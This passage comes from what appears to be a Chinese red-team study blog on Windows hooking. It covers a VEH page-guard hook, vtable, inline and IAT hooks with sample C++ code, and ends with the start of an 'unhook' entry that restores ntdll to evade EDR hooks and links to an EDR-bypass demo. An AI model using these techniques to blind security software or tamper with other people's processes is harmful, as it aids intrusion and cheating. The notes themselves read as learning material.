class="hljs-built_in">PageAlignment</span>(ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress);<br><span class="hljs-keyword">auto</span> it_base = gs_pageHook_base.<span class="hljs-built_in">find</span>(pageBase);<br><span class="hljs-keyword">if</span> (it_base == gs_pageHook_base.<span class="hljs-built_in">end</span>()) &#123;<br>.<br><span class="hljs-comment">// 不是咱们设置的页面属性产生的异常，忽略</span><br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br><br><span class="hljs-comment">// 执行的指令与我们的Hook位于同一页面，恢复原有属性</span><br>DWORD uselessProtect;<br><span class="hljs-built_in">VirtualProtect</span>(pageBase, <span class="hljs-number">0x1000</span>, it_base-&gt;second.protect, &amp;uselessProtect);<br><br><br><span class="hljs-comment">// 获取发生异常的线程的上下文</span><br>LPCONTEXT context = ExceptionInfo-&gt;ContextRecord;<br><br><br><span class="hljs-keyword">auto</span> it_addr = gs_pageHook_addr.<span class="hljs-built_in">find</span>(ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress);<br><span class="hljs-keyword">if</span> (it_addr != gs_pageHook_addr.<span class="hljs-built_in">end</span>()) &#123;<br><span class="hljs-comment">// 是被hook的地址</span><br><br><span class="hljs-comment">// 调用回调  实现hook</span><br>it_addr-&gt;second.<span class="hljs-built_in">m_callback</span>(context);<br>&#125;<br><br>context-&gt;EFlags |= <span class="hljs-number">0x100</span>;<br><br><span class="hljs-comment">// 用于识别是否咱们设置的单步</span><br>gs_pageHook_step.<span class="hljs-built_in">insert</span>(std::<span class="hljs-built_in">pair</span>&lt;DWORD, PageRecord&amp;&gt;(<span class="hljs-built_in">GetCurrentThreadId</span>(), it_base-&gt;second));<br><br><br><span class="hljs-comment">//异常处理完成 让程序继续执行</span><br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br><br><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP)<br>&#123;<br>LPCONTEXT pContext = ExceptionInfo-&gt;ContextRecord;<br><br><span class="hljs-comment">// 判断是否DR寄存器触发的异常</span><br><span class="hljs-keyword">if</span> (pContext-&gt;Dr6 &amp; <span class="hljs-number">0xf</span>) &#123;<br><span class="hljs-comment">// 排除DR寄存器触发的单步异常</span><br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 单步异常</span><br><span class="hljs-keyword">auto</span> it = gs_pageHook_step.<span class="hljs-built_in">find</span>(<span class="hljs-built_in">GetCurrentThreadId</span>());<br><span class="hljs-keyword">if</span> (it == gs_pageHook_step.<span class="hljs-built_in">end</span>()) &#123;<br><span class="hljs-comment">//不是咱们设置的单步断点，不处理</span><br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br><br><br>DWORD uselessProtect;<br><span class="hljs-comment">// 恢复Hook</span><br><span class="hljs-built_in">VirtualProtect</span>(it-&gt;second.pageBase, <span class="hljs-number">0x1000</span>, PAGE_READWRITE, &amp;uselessProtect);<br><br>gs_pageHook_step.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">GetCurrentThreadId</span>());<br><br><span class="hljs-comment">// 不需要重设TF，单步异常自动将TF置0</span><br><span class="hljs-comment">// 单步异常是陷阱类异常，无需修复ip</span><br><br><span class="hljs-comment">// 异常处理完成 让程序继续执行</span><br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br><br><br><br>YPageHook::<span class="hljs-built_in">YPageHook</span>() &#123;<br>m_status = Status::invalid;<br>m_hookAddr = <span class="hljs-literal">nullptr</span>;<br>m_callback = <span class="hljs-literal">nullptr</span>;<br><br><span class="hljs-comment">//注册VEH</span><br>m_exceptionHandlerHandle = <span class="hljs-built_in">AddVectoredExceptionHandler</span>(TRUE, ExceptionHandler);<br>&#125;<br><br>YPageHook::~<span class="hljs-built_in">YPageHook</span>() &#123;<br><span class="hljs-comment">//移除VEH</span><br><span class="hljs-built_in">RemoveVectoredExceptionHandler</span>(m_exceptionHandlerHandle);<br><br><span class="hljs-built_in">uninstall</span>();<br>&#125;<br><br><br><span class="hljs-comment">//install就是装载hook</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">YPageHook::install</span><span class="hljs-params">(LPVOID hookAddr, HookCallBack callback)</span> </span>&#123;<br><br><span class="hljs-keyword">if</span> (m_status == Status::valid) &#123;<br><span class="hljs-keyword">throw</span> Error::repeatInstall;<br>&#125;<br><br><span class="hljs-keyword">auto</span> it_addr = gs_pageHook_addr.<span class="hljs-built_in">find</span>(hookAddr);<br><span class="hljs-keyword">if</span> (it_addr != gs_pageHook_addr.<span class="hljs-built_in">end</span>()) &#123;<br><span class="hljs-keyword">throw</span> Error::duplicateAddress;<br>&#125;<br><br>LPVOID pageBase = <span class="hljs-built_in">PageAlignment</span>(hookAddr);<br><br>m_hookAddr = hookAddr;<br>m_callback = callback;<br>m_status = Status::valid;<br><br>gs_pageHook_addr.<span class="hljs-built_in">insert</span>(std::<span class="hljs-built_in">pair</span>&lt;LPVOID, PageHook&amp;&gt;(hookAddr, *<span class="hljs-keyword">this</span>)); <span class="hljs-comment">//校准插入hook基址</span><br><span class="hljs-keyword">auto</span> it_base = gs_pageHook_base.<span class="hljs-built_in">find</span>(pageBase);<br><span class="hljs-keyword">if</span> (it_base == gs_pageHook_base.<span class="hljs-built_in">end</span>()) &#123;<br>PageRecord pageRecord;<br>pageRecord.count = <span class="hljs-number">1</span>;<br>pageRecord.pageBase = pageBase;<br>pageRecord.protect = <span class="hljs-number">0</span>;<br>gs_pageHook_base.<span class="hljs-built_in">insert</span>(std::<span class="hljs-built_in">pair</span>&lt;LPVOID, PageRecord&gt;(pageBase, pageRecord));<br>it_base = gs_pageHook_base.<span class="hljs-built_in">find</span>(pageBase);<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">VirtualProtect</span>(pageBase, <span class="hljs-number">0x1000</span>, PAGE_READWRITE, &amp;it_base-&gt;second.protect)) &#123;<br><span class="hljs-built_in">uninstall</span>();<span class="hljs-comment">//判断是否可执行 如果可执行就直接uninstall跳过 因为我们要 装载-&gt;执行-&gt;卸载 。这样就能hook</span><br>            <span class="hljs-comment">///所以在装载的其中就要为源代码故意多了单页面多个异常点hook的技术强制RW权限导致报错 进而引入到我们的hook.最后uninstall恢复我们的属性</span><br>            <span class="hljs-comment">//因为都是分开写的，导致可以单页面多个异常点hook的技术</span><br><span class="hljs-keyword">throw</span> Error::setProtectFailed;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>++it_base-&gt;second.count;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">YPageHook::uninstall</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (m_status == Status::invalid) &#123;<br><span class="hljs-keyword">throw</span> Error::repeatUninstall;<br>&#125;<br><br>LPVOID pageBase = <span class="hljs-built_in">PageAlignment</span>(m_hookAddr);<br><span class="hljs-keyword">auto</span> it_base = gs_pageHook_base.<span class="hljs-built_in">find</span>(pageBase);<br><br><span class="hljs-keyword">if</span> (it_base != gs_pageHook_base.<span class="hljs-built_in">end</span>()) &#123;<br><span class="hljs-keyword">if</span> (it_base-&gt;second.count == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">VirtualProtect</span>(pageBase, <span class="hljs-number">0x1000</span>, it_base-&gt;second.protect, &amp;it_base-&gt;second.protect)) &#123;<br><span class="hljs-keyword">throw</span> Error::setProtectFailed;<br>&#125;<br>gs_pageHook_base.<span class="hljs-built_in">erase</span>(it_base);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>--it_base-&gt;second.count;<br>&#125;<br>&#125;<br><br>gs_pageHook_addr.<span class="hljs-built_in">erase</span>(m_hookAddr);<br><br>m_hookAddr = <span class="hljs-literal">nullptr</span>;<br>m_callback = <span class="hljs-literal">nullptr</span>;<br><br>m_status = Status::invalid;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>外挂使用EIP实现hook</p><p>context-&gt;Eip &#x3D; (DWORD) &amp; ReturnOrigianlFunc</p>]]></content>
    
    
    <categories>
      
      <category>hook 红队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>总结一下hook吧</title>
    <link href="/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8Bhook%E5%90%A7.html"/>
    <url>/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8Bhook%E5%90%A7.html</url>
    
    <content type="html"><![CDATA[<p>常见的有虚表vitualtables hook，inline hook，iat hook，callbackhook等</p><p>其它那些 unhook这种衍生技术就分到别的章节学习笔记</p><h2 id="虚表vitualtables-hook"><a href="#虚表vitualtables-hook" class="headerlink" title="虚表vitualtables hook"></a>虚表vitualtables hook</h2><h3 id="什么是虚表HOOK？"><a href="#什么是虚表HOOK？" class="headerlink" title="什么是虚表HOOK？"></a>什么是虚表HOOK？</h3><p>首先我们应该要先了解<strong>什么是虚表</strong>？<br>虚函数表-&gt;虚函数</p><p>这张表解决了继承、覆盖等问题，保证其能反应实际的函数。</p><h3 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h3><p>将虚表的虚函数地址更改成我们的即可</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-number">1</span>.获得虚表指针<br><span class="hljs-number">2</span>.修改虚表的内存保护属性为可读可写<br><span class="hljs-number">3</span>.修改虚表中的虚函数地址为我们的函数地址.<br><span class="hljs-number">4</span>.还原HOOK,也就是将原函数地址,写回到虚表中<br><span class="hljs-number">5</span>.恢复原保护属性<br></code></pre></td></tr></table></figure><p><strong>1.获得虚表指针</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> pVftableAddress = *(<span class="hljs-type">int</span> *)&amp;test;        <span class="hljs-comment">//第一步,获取自己的虚表指针</span><br><br></code></pre></td></tr></table></figure><p><strong>2.修改虚表的内存保护属性为可读可写</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD OldProtect = <span class="hljs-number">0</span>;                       <span class="hljs-comment">//第二步修改虚表指针的内存保护属性,下方更改虚表</span><br><span class="hljs-built_in">VirtualProtect</span>((<span class="hljs-type">void</span> *)pVftableAddress, <span class="hljs-number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtect);<span class="hljs-comment">//修改内存保护属性,其地址是虚表指针地址</span><br><br></code></pre></td></tr></table></figure><p><strong>3.修改虚表中的虚函数地址为我们的函数地址.</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">(*(<span class="hljs-type">int</span> *)pVftableAddress) = (<span class="hljs-type">int</span>)MyVirtual;<span class="hljs-comment">//第三步,HOOK,也就是将我们的函数地址,写入到虚表中.</span><br></code></pre></td></tr></table></figure><p><strong>第四步,还原HOOK,也就是将原函数地址,写回到虚表中</strong></p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-comment">(*(int *)</span>pVftableAddress) = (int)__pOldFunction;<span class="hljs-comment">//第四步,还原HOOK,也就是将原函数地址,写回到虚表中.</span><br></code></pre></td></tr></table></figure><p><strong>第五步：恢复原保护属性</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">VirtualProtect((<span class="hljs-params">void</span> <span class="hljs-operator">*</span>)</span>pVftableAddress, <span class="hljs-number">0x1000</span>, OldProtect, &amp;NewProtect);   <span class="hljs-comment">// 第五步：恢复原保护属性</span><br></code></pre></td></tr></table></figure><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>优点：相对其他hook来说比较简单</p><p>缺点：比较明显，只能用于虚函数，使用范围小。</p><h3 id="c-中的RTTI"><a href="#c-中的RTTI" class="headerlink" title="c++中的RTTI"></a>c++中的RTTI</h3><p>在对虚函数进行hook之前 需要先对C++的RRTI进行了解，如果不了解RTTI和虚表在内存上布局上的依赖关系,就无法hook虚表里面的所有函数</p><p>一些<a href="https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1?fromModule=lemma_inlink">面向对象</a>专家在传播自己的设计理念时，大多都主张在设计和开发中明智地使用虚拟成员函数，而不用 RTTI 机制。但是，在很多情况下，<a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E5%87%BD%E6%95%B0?fromModule=lemma_inlink">虚拟函数</a>无法克服本身的局限。每每涉及到处理异类容器和根<a href="https://baike.baidu.com/item/%E5%9F%BA%E7%B1%BB?fromModule=lemma_inlink">基类</a>层次（如 MFC）时，不可避免要对对象类型进行动态判断，也就是动态类型的侦测。如何确定对象的动态类型呢？答案是使用内建的 RTTI 中的运算符：typeid 和 dynamic_cast。</p><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><br>ULONG_PTR __pOldFunction = <span class="hljs-literal">NULL</span>;<br>ULONG_PTR __pOldFunctionAddress = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">MyTest</span>()<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MyTest::MyTest()\r\n&quot;</span>);<br>&#125;<br>~<span class="hljs-built_in">MyTest</span>()<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MyTest::~MyTest()\r\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Vritual</span><span class="hljs-params">()</span></span>;<br><span class="hljs-type">int</span> m_Number;<br>&#125;;<br><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyTest::Vritual</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;原虚函数Vritual,未被hook\r\n\r\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyVirtual</span><span class="hljs-params">()</span>                                <span class="hljs-comment">//我们将虚表中的函数地址换为我们的函数地址</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;已被hook，我们自己的函数\r\n\r\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyTest::print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;void MyTest::print()\r\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>MyTest test;<br>MyTest &amp;obj = test;    <br>obj.<span class="hljs-built_in">Vritual</span>();   <span class="hljs-comment">//虚函数调用,测试作用</span><br><br><span class="hljs-type">int</span> pVftableAddress = *(<span class="hljs-type">int</span> *)&amp;test;        <span class="hljs-comment">//第一步,获取自己的虚表指针</span><br><br>__pOldFunction = (*(<span class="hljs-type">int</span> *)pVftableAddress);  <span class="hljs-comment">//保存原函数地址.因为我这里比较简单只有一个虚函数，多个虚函数还需要考虑索引位置的问题</span><br><br><br>DWORD OldProtect = <span class="hljs-number">0</span>;                       <span class="hljs-comment">//第二步修改虚表指针的内存保护属性,下方更改虚表</span><br>DWORD NewProtect = PAGE_EXECUTE_READWRITE;<br><span class="hljs-built_in">VirtualProtect</span>((<span class="hljs-type">void</span> *)pVftableAddress, <span class="hljs-number">0x1000</span>, NewProtect, &amp;OldProtect);<span class="hljs-comment">//修改内存保护属性,其地址是虚表指针地址</span><br><br>(*(<span class="hljs-type">int</span> *)pVftableAddress) = (<span class="hljs-type">int</span>)MyVirtual;<span class="hljs-comment">//第三步,HOOK,也就是将我们的函数地址,写入到虚表中.</span><br><br><br>obj.<span class="hljs-built_in">Vritual</span>();   <span class="hljs-comment">//重新调用,看看是否被HOOK</span><br><br>(*(<span class="hljs-type">int</span> *)pVftableAddress) = (<span class="hljs-type">int</span>)__pOldFunction;<span class="hljs-comment">//第四步,还原HOOK,也就是将原函数地址,写回到虚表中.</span><br><br><span class="hljs-built_in">VirtualProtect</span>((<span class="hljs-type">void</span> *)pVftableAddress, <span class="hljs-number">0x1000</span>, OldProtect, &amp;NewProtect);   <span class="hljs-comment">// 第五步：恢复原保护属性</span><br><br>obj.<span class="hljs-built_in">Vritual</span>();   <span class="hljs-comment">//恢复地址后，重新调用。</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>转载 <a href="https://blog.csdn.net/weixin_43742894/article/details/105998391">https://blog.csdn.net/weixin_43742894/article/details/105998391</a></p><h2 id="模糊假定"><a href="#模糊假定" class="headerlink" title="模糊假定"></a>模糊假定</h2><p>如果做一个假虚表且这个假虚表足够长,然后把假虚表的地址赋值给对象中的虚表指针,那么所有对虚函数的调用代码就会变成”call[虚表地址+虚表偏移]”。只要贾诩表的长度大于真虚表可能的最大偏移,同时使用贾诩表存放虚表监控函数的地址,这样对于虚函数中所有的调用都可以hook,这种就叫做模糊假定</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.先做一张很大的假虚表 可以是40000表项 因为虚表的最大容量为40000表项</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pJmptable</span> = VitualAlloc(NULL,假虚表的个数 * sizeof(DWORD),MEM_COMMIT,PAGE_EXECUTE_READWAIT)<br></code></pre></td></tr></table></figure><p>2.建立跳转表并初始化跳转表和假虚表</p><p>3.重定向对象的虚表指针</p><h2 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h2><p>inline hook 本质：就是jmp到我们需要执行的代码，执行完后再jmp回来。</p><p>1、安装Inline Hook</p><p>参数校验<br>判断要替换的硬编码长度是否合适<br>将要Hook的内存修改为可写：VirtualProtectEx或VirtualProtect<br>创建内存空间，存储替换前的硬编码<br>得到要跳转的值<br>要跳转的地址 &#x3D; E9的地址 + 5 +真正跳转的地址<br>–&gt;E9后面的地址 &#x3D; 要跳转的地址 - E9的地址 - 5<br>将要Hook的内存全部初始化成NOP (长度&gt;5 )<br>修改要Hook的硬编码<br>修改hook状态</p><p>2、使用被Hook的函数</p><p>这时使用的就是钩子函数<br>钩子函数得是裸函数<br>保存寄存器<br>获取数据<br>恢复寄存器<br>执行被覆盖的硬编码<br>执行完毕 跳回Hook地址</p><p>3、卸载Inline Hook</p><p>判断是否需要卸载，没Hook当然就不需要卸载<br>修改内存为可写：VirtualProtectEx或VirtualProtect<br>恢复原来的硬编码<br>修改hook状态<br>&#x3D;&#x3D;Inline Hook 最需要注意的就是自己更改的硬编码需要将其还原，不能多加也不能少添&#x3D;&#x3D;</p><h2 id="iat-hook"><a href="#iat-hook" class="headerlink" title="iat hook"></a>iat hook</h2><p>IAT hook 还是需要有先行条件的，就是导入表里面得有所使用函数的地址。</p><p>导入表里面没有被调函数的地址情况：</p><p>被调函数与调用函数在同一模块<br>直接自己使用LoadLibrary，GetProcAddress来加载函数<br>对于这种无法用IAT hook 的情况，我们可以使用inline hook。</p><p>讲到iat又要讲到PE表的双桥就够 再来复习一遍<a href="https://blog.csdn.net/weixin_43742894/article/details/106150321">https://blog.csdn.net/weixin_43742894/article/details/106150321</a></p><h4 id="双桥结构"><a href="#双桥结构" class="headerlink" title="双桥结构"></a>双桥结构</h4><p>简略说一下就是</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">桥<span class="hljs-number">1</span> <span class="hljs-built_in">INT</span><br>可以让你找到调用的函数名称或函数的索引编号<br>桥<span class="hljs-number">2</span> IAT <br>可以帮你找到该函数指令代码在内存空间的地址<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202211021336354.png" alt="在这里插入图片描述"></p><p>当PE被加载进虚拟地址空间以后，<strong>IAT的内容会被操作系统更改为函数的VA</strong>。这个修改最终导致通向“值-名称”描述的桥2发生断裂，如<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202211021337031.png" alt="在这里插入图片描述"></p><p>当桥2发生断裂后，如果没有桥1作为参照（因为桥1和桥2维护了两个一一对应的函数RVA），我们就无法重新找到该地址到底是调用了那个函数。这就是为什么在导入表数据结构中存在两个桥的原因，也是为什么单桥导入表结构中无法实施绑定的原因。</p><p>&#x3D;&#x3D;双桥断裂的过程：&#x3D;&#x3D;<br>在PE加载的时候，双桥结构会断裂，IAT 会被PE加载器重写，PE加载器先搜索INT，PE加载器迭代搜索INT数组中的每个指针，找出 INT所指向的IMAGE_IMPORT_BY_NAME结构中的函数在内存中的真正的地址，并把它替代原来IAT中的值。<br>也就是当程序加载到内存以后，导入表部分发生变化的值正是IMAGE_IMPORT_DESCRIPTOR结构中的FirstThunk字段指向的函数指针表内容。<br>&#x3D;&#x3D;这些内容已经不是指向函数名的指针了，而是指向了虚拟内存中该函数的可执行代码的地址！所以其含义也由原来的函数指针更改为函数的入口地址。&#x3D;&#x3D;现在看来，所有的这些值最终都指向了同一片连续的区域，从而形成了我们常说的IAT。</p><p>&#x3D;&#x3D;总结：&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.在内存中，桥<span class="hljs-number">1</span>可以让你找到调用的函数名称或函数的索引编号；桥<span class="hljs-number">2</span>却可以帮助你找到该函数指令代码在内存空间的地址。<br><span class="hljs-attribute">2</span>.IAT原本指向函数名的指针，双桥结构断裂后，指向了虚拟内存中该函数的可执行代码的地址。<br><span class="hljs-attribute">3</span>.为什么要有INT和IAT俩个桥：当桥<span class="hljs-number">2</span>发生断裂后，如果没有桥<span class="hljs-number">1</span>作为参照（因为桥<span class="hljs-number">1</span>和桥<span class="hljs-number">2</span>维护了两个一一对应的函数RVA），我们就无法重新找到该地址到底是调用了那个函数。<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;双桥结构断裂之后，IAT中存放的就是函数的真实地址，我们修改这个地址也就是实现了Hook。&#x3D;&#x3D;</p><p>&#x3D;&#x3D;实现原理：&#x3D;&#x3D;<br>在进行Windows编程的时候，我们会经常使用Windows的API函数。而我们的API函数一般都是写在dll里，导入表里写着加载的dll和函数，代表该模块调用了哪些外部API，模块被加载到内存后， PE加载器会修改该表，地址改成外部API重定位后的真实地址， 我们只要直接把里面的地址改成我们新函数的地址， 就可以完成对相应API的Hook。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-number">1</span>、在Dll里构造Detour函数(也就是我们自己的函数)<br><span class="hljs-number">2</span>、获取<span class="hljs-keyword">Target</span>函数地址，并找到<span class="hljs-keyword">Target</span>函数所在的IAT的地址<br><span class="hljs-number">3</span>、保存原始的IAT地址和IAT地址所存储的内容<br><span class="hljs-number">4</span>、修改IAT地址中的数据(前提：修改内存属性为可写)<br><span class="hljs-number">5</span>、恢复IAT<br>如果需要调用原来API函数，可以直接使用保存的API地址，可以就保证了HOOK的有效性<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_43742894/article/details/106151669">https://blog.csdn.net/weixin_43742894/article/details/106151669</a></p><h2 id="callbackhook"><a href="#callbackhook" class="headerlink" title="callbackhook"></a>callbackhook</h2><p>回调函数callback：所调用函数执行完，之后调用的函数<br>钩子函数hook：消息到达目的地之前，进行拦截，处理消息</p>]]></content>
    
    
    <categories>
      
      <category>hook 红队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unhook</title>
    <link href="/unhook.html"/>
    <url>/unhook.html</url>
    
    <content type="html"><![CDATA[<p>总结unhook 可以参考那个远程加载PE 还有RefleXXion-main </p><p> <a href="https://bafybeig57rf7bmgmqokxw4uddq4pca5axeag52aibrmdywrgr74papvxxi.ipfs.cthd.icu/p/page-11532.html">https://bafybeig57rf7bmgmqokxw4uddq4pca5axeag52aibrmdywrgr74papvxxi.ipfs.cthd.icu/p/page-11532.html</a></p><p>  <a href="https://github.com/7BitsTeam/EDR-Bypass-demo">https://github.com/7BitsTeam/EDR-Bypass-demo</a></p><h2 id="先看一下远程加载PE"><a href="#先看一下远程加载PE" class="headerlink" title="先看一下远程加载PE"></a>先看一下远程加载PE</h2><p>UnhookNtdll()找到新加载的ntdll.dll副本的.text段，并复制挂起的一个</p><p>为写权限准备ntdll.dll内存区域。</p><p>将原始的.text部分复制到NTDLL内存中</p><p>恢复NTDLL的原始保护设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">UnhookNtdll</span><span class="hljs-params">(<span class="hljs-type">const</span> HMODULE hNtdll, <span class="hljs-type">const</span> LPVOID pMapping)</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one</span><br><span class="hljs-comment">        